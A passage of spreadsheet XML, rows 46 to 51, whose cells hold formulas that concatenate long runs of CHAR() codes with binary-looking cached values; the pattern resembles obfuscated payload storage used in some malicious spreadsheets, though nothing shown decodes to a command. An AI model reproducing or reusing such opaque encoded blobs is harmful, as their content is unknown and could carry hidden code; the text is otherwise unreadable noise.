        <f>CHAR(214)&amp;CHAR(173)&amp;CHAR(105)&amp;CHAR(46)&amp;CHAR(255)&amp;CHAR(234)&amp;CHAR(22)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>Ö­i.ÿê_x0016_±ÖÈ</v>
      </c>
    </row>
    <row r="47" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B47" t="str">
        <f>CHAR(249)&amp;CHAR(234)&amp;CHAR(136)&amp;CHAR(117)&amp;CHAR(19)&amp;CHAR(163)&amp;CHAR(138)&amp;CHAR(6)&amp;CHAR(150)&amp;CHAR(197)&amp;CHAR(131)&amp;CHAR(212)&amp;CHAR(252)&amp;CHAR(132)&amp;CHAR(55)&amp;CHAR(101)&amp;CHAR(40)&amp;CHAR(134)&amp;CHAR(54)&amp;CHAR(150)&amp;CHAR(4)&amp;CHAR(212)&amp;CHAR(39)&amp;CHAR(22)&amp;CHAR(23)&amp;CHAR(156)&amp;CHAR(164)&amp;CHAR(70)&amp;CHAR(160)&amp;CHAR(32)&amp;CHAR(74)&amp;CHAR(155)&amp;CHAR(190)&amp;CHAR(79)&amp;CHAR(104)&amp;CHAR(73)&amp;CHAR(26)&amp;CHAR(205)&amp;CHAR(225)&amp;CHAR(65)&amp;CHAR(198)&amp;CHAR(125)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(92)&amp;CHAR(169)&amp;CHAR(215)&amp;CHAR(42)&amp;CHAR(186)&amp;CHAR(159)&amp;CHAR(112)&amp;CHAR(75)&amp;CHAR(211)&amp;CHAR(174)&amp;CHAR(248)&amp;CHAR(183)&amp;CHAR(132)&amp;CHAR(164)&amp;CHAR(189)&amp;CHAR(93)&amp;CHAR(241)&amp;CHAR(66)&amp;CHAR(83)&amp;CHAR(185)&amp;CHAR(192)&amp;CHAR(101)&amp;CHAR(79)&amp;CHAR(71)&amp;CHAR(14)&amp;CHAR(69)&amp;CHAR(220)&amp;CHAR(240)&amp;CHAR(165)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(145)&amp;CHAR(37)&amp;CHAR(15)&amp;CHAR(72)&amp;CHAR(24)&amp;CHAR(76)&amp;CHAR(177)&amp;CHAR(200)&amp;CHAR(161)&amp;CHAR(105)&amp;CHAR(132)&amp;CHAR(181)&amp;CHAR(46)&amp;CHAR(81)&amp;CHAR(237)&amp;CHAR(242)&amp;CHAR(24)&amp;CHAR(244)&amp;CHAR(168)&amp;CHAR(218)&amp;CHAR(188)&amp;CHAR(52)&amp;CHAR(87)&amp;CHAR(44)&amp;CHAR(189)&amp;CHAR(85)&amp;CHAR(157)&amp;CHAR(69)&amp;CHAR(237)&amp;CHAR(157)&amp;CHAR(80)&amp;CHAR(169)&amp;CHAR(149)&amp;CHAR(140)&amp;CHAR(180)&amp;CHAR(207)&amp;CHAR(204)&amp;CHAR(1)&amp;CHAR(181)&amp;CHAR(208)&amp;CHAR(130)&amp;CHAR(133)&amp;CHAR(199)&amp;CHAR(34)&amp;CHAR(204)&amp;CHAR(238)&amp;CHAR(52)&amp;CHAR(11)&amp;CHAR(20)&amp;CHAR(227)&amp;CHAR(126)&amp;CHAR(68)&amp;CHAR(160)&amp;CHAR(155)&amp;CHAR(207)&amp;CHAR(107)&amp;CHAR(208)&amp;CHAR(19)&amp;CHAR(87)&amp;CHAR(117)&amp;CHAR(3)&amp;CHAR(247)&amp;CHAR(117)&amp;CHAR(73)&amp;CHAR(60)&amp;CHAR(241)&amp;CHAR(19)&amp;CHAR(192)&amp;CHAR(139)&amp;CHAR(224)&amp;CHAR(60)&amp;CHAR(204)&amp;CHAR(175)&amp;CHAR(229)&amp;CHAR(31)&amp;CHAR(182)&amp;CHAR(180)&amp;CHAR(188)&amp;CHAR(119)&amp;CHAR(161)&amp;CHAR(21)&amp;CHAR(252)&amp;CHAR(223)&amp;CHAR(189)&amp;CHAR(221)&amp;CHAR(23)&amp;CHAR(232)&amp;CHAR(23)&amp;CHAR(244)&amp;CHAR(170)&amp;CHAR(159)&amp;CHAR(14)&amp;CHAR(28)&amp;CHAR(168)&amp;CHAR(90)&amp;CHAR(195)&amp;CHAR(198)&amp;CHAR(182)&amp;CHAR(8)&amp;CHAR(61)&amp;CHAR(251)&amp;CHAR(71)&amp;CHAR(135)&amp;CHAR(37)&amp;CHAR(157)&amp;CHAR(217)&amp;CHAR(177)&amp;CHAR(61)&amp;CHAR(193)&amp;CHAR(88)&amp;CHAR(46)&amp;CHAR(239)&amp;CHAR(30)&amp;CHAR(126)&amp;CHAR(253)&amp;CHAR(168)&amp;CHAR(168)&amp;CHAR(47)&amp;CHAR(241)&amp;CHAR(102)&amp;CHAR(62)&amp;CHAR(7)&amp;CHAR(79)&amp;CHAR(243)&amp;CHAR(179)&amp;CHAR(81)&amp;CHAR(151)&amp;CHAR(45)&amp;CHAR(7)&amp;CHAR(32)&amp;CHAR(222)&amp;CHAR(20)&amp;CHAR(92)&amp;CHAR(207)&amp;CHAR(172)&amp;CHAR(70)&amp;CHAR(210)&amp;CHAR(160)&amp;CHAR(140)&amp;CHAR(253)&amp;CHAR(255)&amp;CHAR(62)&amp;CHAR(208)&amp;CHAR(65)&amp;CHAR(87)&amp;CHAR(219)&amp;CHAR(130)&amp;CHAR(87)&amp;CHAR(50)&amp;CHAR(148)&amp;CHAR(213)&amp;CHAR(96)&amp;CHAR(153)&amp;CHAR(11)&amp;CHAR(39)&amp;CHAR(75)&amp;CHAR(52)&amp;CHAR(93)&amp;CHAR(60)&amp;CHAR(146)&amp;CHAR(239)&amp;CHAR(200)&amp;CHAR(212)&amp;CHAR(84)&amp;CHAR(198)&amp;CHAR(151)&amp;CHAR(243)&amp;CHAR(48)&amp;CHAR(240)&amp;CHAR(174)&amp;CHAR(224)&amp;CHAR(65)&amp;CHAR(237)&amp;CHAR(27)&amp;CHAR(199)&amp;CHAR(146)&amp;CHAR(112)&amp;CHAR(146)</f>
        <v>ùêˆu_x0013_£Š_x0006_–ÅƒÔü„7e(†6–_x0004_Ô'_x0016__x0017_œ¤F  J›¾OhI_x001A_ÍáAÆ}_x000E__x0004_Ë†\©×*ºŸpKÓ®ø·„¤½]ñBS¹ÀeOG_x000E_EÜð¥Ê‚‘%_x000F_H_x0018_L±È¡i„µ.Qíò_x0018_ô¨Ú¼4W,½UEíP©•Œ´ÏÌ_x0001_µÐ‚…Ç"Ìî4_x000B__x0014_ã~D ›ÏkÐ_x0013_Wu_x0003_÷uI&lt;ñ_x0013_À‹à&lt;Ì¯å_x001F_¶´¼w¡_x0015_üß½Ý_x0017_è_x0017_ôªŸ_x000E__x001C_¨ZÃÆ¶_x0008_=ûG‡%Ù±=ÁX.ï_x001E_~ý¨¨/ñf&gt;_x0007_Oó³Q—-_x0007_ Þ_x0014_\Ï¬FÒ Œýÿ&gt;ÐAWÛ‚W2”Õ`™_x000B_'K4]&lt;’ïÈÔTÆ—ó0ð®àAí_x001B_Ç’p’</v>
      </c>
      <c r="C47" t="str">
        <f>CHAR(105)&amp;CHAR(38)&amp;CHAR(59)&amp;CHAR(159)&amp;CHAR(118)&amp;CHAR(58)&amp;CHAR(214)&amp;CHAR(128)&amp;CHAR(170)&amp;CHAR(165)</f>
        <v>i&amp;;Ÿv:Ö€ª¥</v>
      </c>
    </row>
    <row r="48" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B48" t="str">
        <f>CHAR(237)&amp;CHAR(19)&amp;CHAR(81)&amp;CHAR(236)&amp;CHAR(105)&amp;CHAR(60)&amp;CHAR(113)&amp;CHAR(138)&amp;CHAR(91)&amp;CHAR(180)&amp;CHAR(9)&amp;CHAR(220)&amp;CHAR(95)&amp;CHAR(37)&amp;CHAR(255)&amp;CHAR(165)&amp;CHAR(2)&amp;CHAR(196)&amp;CHAR(223)&amp;CHAR(125)&amp;CHAR(149)&amp;CHAR(81)&amp;CHAR(232)&amp;CHAR(153)&amp;CHAR(7)&amp;CHAR(39)&amp;CHAR(118)&amp;CHAR(82)&amp;CHAR(13)&amp;CHAR(88)&amp;CHAR(189)&amp;CHAR(198)&amp;CHAR(103)&amp;CHAR(97)&amp;CHAR(167)&amp;CHAR(164)&amp;CHAR(128)&amp;CHAR(168)&amp;CHAR(55)&amp;CHAR(131)&amp;CHAR(220)&amp;CHAR(27)&amp;CHAR(78)&amp;CHAR(241)&amp;CHAR(81)&amp;CHAR(89)&amp;CHAR(224)&amp;CHAR(11)&amp;CHAR(50)&amp;CHAR(18)&amp;CHAR(149)&amp;CHAR(242)&amp;CHAR(237)&amp;CHAR(29)&amp;CHAR(167)&amp;CHAR(178)&amp;CHAR(141)&amp;CHAR(122)&amp;CHAR(66)&amp;CHAR(79)&amp;CHAR(88)&amp;CHAR(242)&amp;CHAR(10)&amp;CHAR(201)&amp;CHAR(178)&amp;CHAR(148)&amp;CHAR(133)&amp;CHAR(7)&amp;CHAR(178)&amp;CHAR(144)&amp;CHAR(208)&amp;CHAR(145)&amp;CHAR(160)&amp;CHAR(249)&amp;CHAR(126)&amp;CHAR(199)&amp;CHAR(242)&amp;CHAR(192)&amp;CHAR(253)&amp;CHAR(155)&amp;CHAR(137)&amp;CHAR(57)&amp;CHAR(142)&amp;CHAR(13)&amp;CHAR(47)&amp;CHAR(86)&amp;CHAR(152)&amp;CHAR(236)&amp;CHAR(216)&amp;CHAR(52)&amp;CHAR(139)&amp;CHAR(4)&amp;CHAR(176)&amp;CHAR(11)&amp;CHAR(246)&amp;CHAR(122)&amp;CHAR(168)&amp;CHAR(186)&amp;CHAR(182)&amp;CHAR(236)&amp;CHAR(132)&amp;CHAR(180)&amp;CHAR(102)&amp;CHAR(177)&amp;CHAR(103)&amp;CHAR(116)&amp;CHAR(112)&amp;CHAR(48)&amp;CHAR(2)&amp;CHAR(248)&amp;CHAR(76)&amp;CHAR(124)&amp;CHAR(98)&amp;CHAR(206)&amp;CHAR(217)&amp;CHAR(58)&amp;CHAR(24)&amp;CHAR(103)&amp;CHAR(64)&amp;CHAR(68)&amp;CHAR(90)&amp;CHAR(130)&amp;CHAR(59)&amp;CHAR(215)&amp;CHAR(188)&amp;CHAR(239)&amp;CHAR(156)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(36)&amp;CHAR(173)&amp;CHAR(85)&amp;CHAR(245)&amp;CHAR(83)&amp;CHAR(120)&amp;CHAR(91)&amp;CHAR(191)&amp;CHAR(47)&amp;CHAR(191)&amp;CHAR(89)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(52)&amp;CHAR(131)&amp;CHAR(56)&amp;CHAR(43)&amp;CHAR(61)&amp;CHAR(208)&amp;CHAR(116)&amp;CHAR(188)&amp;CHAR(5)&amp;CHAR(223)&amp;CHAR(99)&amp;CHAR(255)&amp;CHAR(135)&amp;CHAR(174)&amp;CHAR(238)&amp;CHAR(246)&amp;CHAR(3)&amp;CHAR(68)&amp;CHAR(116)&amp;CHAR(78)&amp;CHAR(141)&amp;CHAR(120)&amp;CHAR(34)&amp;CHAR(253)&amp;CHAR(96)&amp;CHAR(17)&amp;CHAR(26)&amp;CHAR(186)&amp;CHAR(199)&amp;CHAR(62)&amp;CHAR(215)&amp;CHAR(68)&amp;CHAR(247)&amp;CHAR(114)&amp;CHAR(32)&amp;CHAR(201)&amp;CHAR(197)&amp;CHAR(58)&amp;CHAR(29)&amp;CHAR(111)&amp;CHAR(215)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(202)&amp;CHAR(225)&amp;CHAR(159)&amp;CHAR(66)&amp;CHAR(121)&amp;CHAR(43)&amp;CHAR(161)&amp;CHAR(29)&amp;CHAR(223)&amp;CHAR(134)&amp;CHAR(18)&amp;CHAR(26)&amp;CHAR(160)&amp;CHAR(251)&amp;CHAR(160)&amp;CHAR(3)&amp;CHAR(234)&amp;CHAR(110)&amp;CHAR(223)&amp;CHAR(178)&amp;CHAR(230)&amp;CHAR(218)&amp;CHAR(235)&amp;CHAR(218)&amp;CHAR(250)&amp;CHAR(237)&amp;CHAR(28)&amp;CHAR(215)&amp;CHAR(58)&amp;CHAR(8)&amp;CHAR(32)&amp;CHAR(236)&amp;CHAR(50)&amp;CHAR(218)&amp;CHAR(120)&amp;CHAR(171)&amp;CHAR(94)&amp;CHAR(247)&amp;CHAR(65)&amp;CHAR(163)&amp;CHAR(166)&amp;CHAR(143)&amp;CHAR(160)&amp;CHAR(91)&amp;CHAR(7)&amp;CHAR(116)&amp;CHAR(26)&amp;CHAR(61)&amp;CHAR(126)&amp;CHAR(105)&amp;CHAR(17)&amp;CHAR(96)&amp;CHAR(145)&amp;CHAR(36)&amp;CHAR(244)&amp;CHAR(51)&amp;CHAR(86)&amp;CHAR(2)&amp;CHAR(139)&amp;CHAR(32)&amp;CHAR(137)&amp;CHAR(249)&amp;CHAR(177)&amp;CHAR(145)&amp;CHAR(172)&amp;CHAR(3)&amp;CHAR(101)&amp;CHAR(140)&amp;CHAR(148)&amp;CHAR(3)</f>
        <v>í_x0013_Qìi&lt;qŠ[´	Ü_%ÿ¥_x0002_Äß}•Qè™_x0007_'vR_x000D_X½Æga§¤€¨7ƒÜ_x001B_NñQYà_x000B_2_x0012_•òí_x001D_§²zBOXò
É²”…_x0007_²Ð‘ ù~ÇòÀý›‰9Ž_x000D_/V˜ìØ4‹_x0004_°_x000B_öz¨º¶ì„´f±gtp0_x0002_øL|bÎÙ:_x0018_g@DZ‚;×¼ïœ]ô$­UõSx[¿/¿Y!34ƒ8+=Ðt¼_x0005_ßcÿ‡®îö_x0003_DtNx"ý`_x0011__x001A_ºÇ&gt;×D÷r ÉÅ:_x001D_o×ÍëÊáŸBy+¡_x001D_ß†_x0012__x001A_ û _x0003_ênß²æÚëÚúí_x001C_×:_x0008_ ì2Úx«^÷A£¦ [_x0007_t_x001A_=~i_x0011_`‘$ô3V_x0002_‹ ‰ù±‘¬_x0003_eŒ”_x0003_</v>
      </c>
      <c r="C48" t="str">
        <f>CHAR(158)&amp;CHAR(131)&amp;CHAR(181)&amp;CHAR(189)&amp;CHAR(243)&amp;CHAR(224)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(134)</f>
        <v>žƒµ½óà!¥û†</v>
      </c>
    </row>
    <row r="49" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B49" t="str">
        <f>CHAR(154)&amp;CHAR(58)&amp;CHAR(54)&amp;CHAR(124)&amp;CHAR(198)&amp;CHAR(177)&amp;CHAR(26)&amp;CHAR(34)&amp;CHAR(219)&amp;CHAR(17)&amp;CHAR(14)&amp;CHAR(67)&amp;CHAR(129)&amp;CHAR(19)&amp;CHAR(131)&amp;CHAR(66)&amp;CHAR(134)&amp;CHAR(18)&amp;CHAR(231)&amp;CHAR(72)&amp;CHAR(42)&amp;CHAR(215)&amp;CHAR(242)&amp;CHAR(62)&amp;CHAR(90)&amp;CHAR(98)&amp;CHAR(82)&amp;CHAR(105)&amp;CHAR(12)&amp;CHAR(142)&amp;CHAR(39)&amp;CHAR(208)&amp;CHAR(148)&amp;CHAR(60)&amp;CHAR(4)&amp;CHAR(63)&amp;CHAR(57)&amp;CHAR(33)&amp;CHAR(238)&amp;CHAR(38)&amp;CHAR(110)&amp;CHAR(12)&amp;CHAR(107)&amp;CHAR(10)&amp;CHAR(21)&amp;CHAR(132)&amp;CHAR(213)&amp;CHAR(168)&amp;CHAR(44)&amp;CHAR(90)&amp;CHAR(219)&amp;CHAR(201)&amp;CHAR(194)&amp;CHAR(13)&amp;CHAR(200)&amp;CHAR(248)&amp;CHAR(135)&amp;CHAR(66)&amp;CHAR(218)&amp;CHAR(174)&amp;CHAR(42)&amp;CHAR(169)&amp;CHAR(176)&amp;CHAR(238)&amp;CHAR(221)&amp;CHAR(29)&amp;CHAR(61)&amp;CHAR(123)&amp;CHAR(193)&amp;CHAR(239)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(64)&amp;CHAR(6)&amp;CHAR(229)&amp;CHAR(77)&amp;CHAR(156)&amp;CHAR(161)&amp;CHAR(222)&amp;CHAR(42)&amp;CHAR(2)&amp;CHAR(203)&amp;CHAR(191)&amp;CHAR(103)&amp;CHAR(161)&amp;CHAR(118)&amp;CHAR(23)&amp;CHAR(152)&amp;CHAR(202)&amp;CHAR(92)&amp;CHAR(70)&amp;CHAR(73)&amp;CHAR(197)&amp;CHAR(115)&amp;CHAR(80)&amp;CHAR(230)&amp;CHAR(56)&amp;CHAR(101)&amp;CHAR(186)&amp;CHAR(61)&amp;CHAR(162)&amp;CHAR(227)&amp;CHAR(219)&amp;CHAR(196)&amp;CHAR(108)&amp;CHAR(252)&amp;CHAR(26)&amp;CHAR(165)&amp;CHAR(154)&amp;CHAR(103)&amp;CHAR(78)&amp;CHAR(203)&amp;CHAR(50)&amp;CHAR(150)&amp;CHAR(142)&amp;CHAR(150)&amp;CHAR(18)&amp;CHAR(188)&amp;CHAR(222)&amp;CHAR(87)&amp;CHAR(19)&amp;CHAR(100)&amp;CHAR(3)&amp;CHAR(180)&amp;CHAR(107)&amp;CHAR(139)&amp;CHAR(223)&amp;CHAR(159)&amp;CHAR(133)&amp;CHAR(189)&amp;CHAR(105)&amp;CHAR(1)&amp;CHAR(191)&amp;CHAR(87)&amp;CHAR(79)&amp;CHAR(82)&amp;CHAR(17)&amp;CHAR(94)&amp;CHAR(132)&amp;CHAR(83)&amp;CHAR(108)&amp;CHAR(124)&amp;CHAR(13)&amp;CHAR(211)&amp;CHAR(138)&amp;CHAR(107)&amp;CHAR(191)&amp;CHAR(134)&amp;CHAR(24)&amp;CHAR(224)&amp;CHAR(196)&amp;CHAR(113)&amp;CHAR(254)&amp;CHAR(114)&amp;CHAR(54)&amp;CHAR(31)&amp;CHAR(13)&amp;CHAR(139)&amp;CHAR(217)&amp;CHAR(98)&amp;CHAR(228)&amp;CHAR(123)&amp;CHAR(41)&amp;CHAR(147)&amp;CHAR(147)&amp;CHAR(216)&amp;CHAR(42)&amp;CHAR(196)&amp;CHAR(4)&amp;CHAR(154)&amp;CHAR(60)&amp;CHAR(65)&amp;CHAR(244)&amp;CHAR(19)&amp;CHAR(202)&amp;CHAR(83)&amp;CHAR(215)&amp;CHAR(36)&amp;CHAR(29)&amp;CHAR(250)&amp;CHAR(127)&amp;CHAR(63)&amp;CHAR(138)&amp;CHAR(218)&amp;CHAR(137)&amp;CHAR(70)&amp;CHAR(112)&amp;CHAR(218)&amp;CHAR(33)&amp;CHAR(72)&amp;CHAR(26)&amp;CHAR(36)&amp;CHAR(16)&amp;CHAR(172)&amp;CHAR(12)&amp;CHAR(154)&amp;CHAR(132)&amp;CHAR(3)&amp;CHAR(43)&amp;CHAR(133)&amp;CHAR(117)&amp;CHAR(130)&amp;CHAR(250)&amp;CHAR(242)&amp;CHAR(122)&amp;CHAR(237)&amp;CHAR(164)&amp;CHAR(88)&amp;CHAR(180)&amp;CHAR(86)&amp;CHAR(79)&amp;CHAR(211)&amp;CHAR(6)&amp;CHAR(42)&amp;CHAR(33)&amp;CHAR(171)&amp;CHAR(99)&amp;CHAR(226)&amp;CHAR(183)&amp;CHAR(40)&amp;CHAR(77)&amp;CHAR(143)&amp;CHAR(94)&amp;CHAR(129)&amp;CHAR(205)&amp;CHAR(60)&amp;CHAR(51)&amp;CHAR(23)&amp;CHAR(82)&amp;CHAR(185)&amp;CHAR(143)&amp;CHAR(93)&amp;CHAR(183)&amp;CHAR(249)&amp;CHAR(88)&amp;CHAR(88)&amp;CHAR(59)&amp;CHAR(219)&amp;CHAR(183)&amp;CHAR(73)&amp;CHAR(184)&amp;CHAR(145)&amp;CHAR(247)&amp;CHAR(5)&amp;CHAR(251)&amp;CHAR(36)&amp;CHAR(185)&amp;CHAR(29)&amp;CHAR(85)&amp;CHAR(66)&amp;CHAR(11)&amp;CHAR(232)&amp;CHAR(125)&amp;CHAR(130)&amp;CHAR(136)</f>
        <v>š:6|Æ±_x001A_"Û_x0011__x000E_C_x0013_ƒB†_x0012_çH*×ò&gt;ZbRi_x000C_Ž'Ð”&lt;_x0004_?9!î&amp;n_x000C_k
_x0015_„Õ¨,ZÛÉÂ_x000D_Èø‡BÚ®*©°îÝ_x001D_={Áï¥ž@_x0006_åMœ¡Þ*_x0002_Ë¿g¡v_x0017_˜Ê\FIÅsPæ8eº=¢ãÛÄlü_x001A_¥šgNË2–Ž–_x0012_¼ÞW_x0013_d_x0003_´k‹ßŸ…½i_x0001_¿WOR_x0011_^„Sl|_x000D_ÓŠk¿†_x0018_àÄqþr6_x001F__x000D_‹Ùbä{)““Ø*Ä_x0004_š&lt;Aô_x0013_ÊS×$_x001D_ú?ŠÚ‰FpÚ!H_x001A_$_x0010_¬_x000C_š„_x0003_+…u‚úòzí¤X´VOÓ_x0006_*!«câ·(M^Í&lt;3_x0017_R¹]·ùXX;Û·I¸‘÷_x0005_û$¹_x001D_UB_x000B_è}‚ˆ</v>
      </c>
      <c r="C49" t="str">
        <f>CHAR(189)&amp;CHAR(112)&amp;CHAR(142)&amp;CHAR(132)&amp;CHAR(172)&amp;CHAR(160)&amp;CHAR(24)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>½pŽ„¬ _x0018_Ë&gt;±</v>
      </c>
    </row>
    <row r="50" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B50" t="str">
        <f>CHAR(144)&amp;CHAR(23)&amp;CHAR(33)&amp;CHAR(210)&amp;CHAR(75)&amp;CHAR(249)&amp;CHAR(239)&amp;CHAR(202)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(101)&amp;CHAR(114)&amp;CHAR(94)&amp;CHAR(193)&amp;CHAR(112)&amp;CHAR(137)&amp;CHAR(208)&amp;CHAR(59)&amp;CHAR(172)&amp;CHAR(187)&amp;CHAR(244)&amp;CHAR(77)&amp;CHAR(31)&amp;CHAR(9)&amp;CHAR(21)&amp;CHAR(177)&amp;CHAR(34)&amp;CHAR(104)&amp;CHAR(140)&amp;CHAR(31)&amp;CHAR(238)&amp;CHAR(255)&amp;CHAR(56)&amp;CHAR(21)&amp;CHAR(46)&amp;CHAR(201)&amp;CHAR(181)&amp;CHAR(160)&amp;CHAR(163)&amp;CHAR(116)&amp;CHAR(103)&amp;CHAR(161)&amp;CHAR(208)&amp;CHAR(128)&amp;CHAR(138)&amp;CHAR(195)&amp;CHAR(203)&amp;CHAR(216)&amp;CHAR(161)&amp;CHAR(130)&amp;CHAR(164)&amp;CHAR(60)&amp;CHAR(138)&amp;CHAR(243)&amp;CHAR(139)&amp;CHAR(37)&amp;CHAR(2)&amp;CHAR(229)&amp;CHAR(23)&amp;CHAR(240)&amp;CHAR(17)&amp;CHAR(54)&amp;CHAR(17)&amp;CHAR(95)&amp;CHAR(84)&amp;CHAR(108)&amp;CHAR(173)&amp;CHAR(44)&amp;CHAR(109)&amp;CHAR(2)&amp;CHAR(79)&amp;CHAR(50)&amp;CHAR(137)&amp;CHAR(221)&amp;CHAR(218)&amp;CHAR(237)&amp;CHAR(79)&amp;CHAR(205)&amp;CHAR(254)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(195)&amp;CHAR(144)&amp;CHAR(177)&amp;CHAR(177)&amp;CHAR(172)&amp;CHAR(120)&amp;CHAR(24)&amp;CHAR(220)&amp;CHAR(251)&amp;CHAR(227)&amp;CHAR(10)&amp;CHAR(254)&amp;CHAR(149)&amp;CHAR(122)&amp;CHAR(229)&amp;CHAR(125)&amp;CHAR(24)&amp;CHAR(54)&amp;CHAR(182)&amp;CHAR(143)&amp;CHAR(2)&amp;CHAR(197)&amp;CHAR(112)&amp;CHAR(158)&amp;CHAR(109)&amp;CHAR(49)&amp;CHAR(228)&amp;CHAR(173)&amp;CHAR(187)&amp;CHAR(99)&amp;CHAR(3)&amp;CHAR(133)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(6)&amp;CHAR(177)&amp;CHAR(15)&amp;CHAR(167)&amp;CHAR(37)&amp;CHAR(206)&amp;CHAR(111)&amp;CHAR(93)&amp;CHAR(216)&amp;CHAR(47)&amp;CHAR(112)&amp;CHAR(144)&amp;CHAR(27)&amp;CHAR(245)&amp;CHAR(153)&amp;CHAR(5)&amp;CHAR(32)&amp;CHAR(78)&amp;CHAR(132)&amp;CHAR(42)&amp;CHAR(210)&amp;CHAR(199)&amp;CHAR(134)&amp;CHAR(232)&amp;CHAR(216)&amp;CHAR(49)&amp;CHAR(63)&amp;CHAR(166)&amp;CHAR(204)&amp;CHAR(116)&amp;CHAR(4)&amp;CHAR(245)&amp;CHAR(73)&amp;CHAR(221)&amp;CHAR(36)&amp;CHAR(39)&amp;CHAR(118)&amp;CHAR(102)&amp;CHAR(75)&amp;CHAR(19)&amp;CHAR(44)&amp;CHAR(139)&amp;CHAR(223)&amp;CHAR(77)&amp;CHAR(137)&amp;CHAR(254)&amp;CHAR(213)&amp;CHAR(215)&amp;CHAR(103)&amp;CHAR(226)&amp;CHAR(120)&amp;CHAR(144)&amp;CHAR(197)&amp;CHAR(72)&amp;CHAR(177)&amp;CHAR(206)&amp;CHAR(125)&amp;CHAR(247)&amp;CHAR(194)&amp;CHAR(179)&amp;CHAR(9)&amp;CHAR(40)&amp;CHAR(44)&amp;CHAR(17)&amp;CHAR(234)&amp;CHAR(185)&amp;CHAR(40)&amp;CHAR(225)&amp;CHAR(10)&amp;CHAR(171)&amp;CHAR(100)&amp;CHAR(80)&amp;CHAR(180)&amp;CHAR(100)&amp;CHAR(9)&amp;CHAR(71)&amp;CHAR(102)&amp;CHAR(148)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(192)&amp;CHAR(32)&amp;CHAR(14)&amp;CHAR(201)&amp;CHAR(69)&amp;CHAR(34)&amp;CHAR(194)&amp;CHAR(228)&amp;CHAR(178)&amp;CHAR(125)&amp;CHAR(84)&amp;CHAR(219)&amp;CHAR(203)&amp;CHAR(12)&amp;CHAR(182)&amp;CHAR(177)&amp;CHAR(44)&amp;CHAR(15)&amp;CHAR(178)&amp;CHAR(40)&amp;CHAR(79)&amp;CHAR(139)&amp;CHAR(242)&amp;CHAR(185)&amp;CHAR(6)&amp;CHAR(201)&amp;CHAR(205)&amp;CHAR(18)&amp;CHAR(67)&amp;CHAR(68)&amp;CHAR(200)&amp;CHAR(194)&amp;CHAR(29)&amp;CHAR(84)&amp;CHAR(238)&amp;CHAR(192)&amp;CHAR(70)&amp;CHAR(91)&amp;CHAR(75)&amp;CHAR(109)&amp;CHAR(64)&amp;CHAR(3)&amp;CHAR(234)&amp;CHAR(147)&amp;CHAR(5)&amp;CHAR(46)&amp;CHAR(131)&amp;CHAR(63)&amp;CHAR(21)&amp;CHAR(49)&amp;CHAR(131)&amp;CHAR(57)&amp;CHAR(91)&amp;CHAR(251)&amp;CHAR(108)&amp;CHAR(195)&amp;CHAR(236)&amp;CHAR(242)&amp;CHAR(234)&amp;CHAR(65)</f>
        <v>_x0017_!ÒKùïÊ_x0003_Šer^Áp‰Ð;¬»ôM_x001F_	_x0015_±"hŒ_x001F_îÿ8_x0015_.Éµ £tg¡Ð€ŠÃËØ¡‚¤&lt;Šó‹%_x0002_å_x0017_ð_x0011_6_x0011__Tl­,m_x0002_O2‰ÝÚíOÍþ_x0001__x001D_Ã±±¬x_x0018_Üûã
þ•zå}_x0018_6¶_x0002_Åpžm1ä­»c_x0003_…_x0005__x0014__x0006_±_x000F_§%Îo]Ø/p_x001B_õ™_x0005_ N„*ÒÇ†èØ1?¦Ìt_x0004_õIÝ$'vfK_x0013_,‹ßM‰þÕ×gâxÅH±Î}÷Â³	(,_x0011_ê¹(á
«dP´d	Gf”£0À _x000E_ÉE"Âä²}TÛË_x000C_¶±,_x000F_²(O‹ò¹_x0006_ÉÍ_x0012_CDÈÂ_x001D_TîÀF[Km@_x0003_ê“_x0005_.ƒ?_x0015_1ƒ9[ûlÃìòêA</v>
      </c>
      <c r="C50" t="str">
        <f>CHAR(158)&amp;CHAR(69)&amp;CHAR(52)&amp;CHAR(185)&amp;CHAR(254)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(212)&amp;CHAR(158)&amp;CHAR(67)</f>
        <v>žE4¹þÏ&gt;ÔžC</v>
      </c>
    </row>
    <row r="51" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B51" t="str">
        <f>CHAR(66)&amp;CHAR(237)&amp;CHAR(208)&amp;CHAR(18)&amp;CHAR(197)&amp;CHAR(31)&amp;CHAR(115)&amp;CHAR(57)&amp;CHAR(101)&amp;CHAR(175)&amp;CHAR(140)&amp;CHAR(10)&amp;CHAR(187)&amp;CHAR(9)&amp;CHAR(180)&amp;CHAR(188)&amp;CHAR(31)&amp;CHAR(211)&amp;CHAR(235)&amp;CHAR(181)&amp;CHAR(134)&amp;CHAR(230)&amp;CHAR(200)&amp;CHAR(12)&amp;CHAR(55)&amp;CHAR(131)&amp;CHAR(228)&amp;CHAR(15)&amp;CHAR(18)&amp;CHAR(148)&amp;CHAR(163)&amp;CHAR(212)&amp;CHAR(223)&amp;CHAR(152)&amp;CHAR(164)&amp;CHAR(153)&amp;CHAR(244)&amp;CHAR(97)&amp;CHAR(77)&amp;CHAR(95)&amp;CHAR(249)&amp;CHAR(187)&amp;CHAR(229)&amp;CHAR(131)&amp;CHAR(89)&amp;CHAR(27)&amp;CHAR(138)&amp;CHAR(179)&amp;CHAR(123)&amp;CHAR(157)&amp;CHAR(84)&amp;CHAR(11)&amp;CHAR(206)&amp;CHAR(1)&amp;CHAR(41)&amp;CHAR(21)&amp;CHAR(154)&amp;CHAR(119)&amp;CHAR(227)&amp;CHAR(33)&amp;CHAR(250)&amp;CHAR(250)&amp;CHAR(175)&amp;CHAR(110)&amp;CHAR(128)&amp;CHAR(156)&amp;CHAR(90)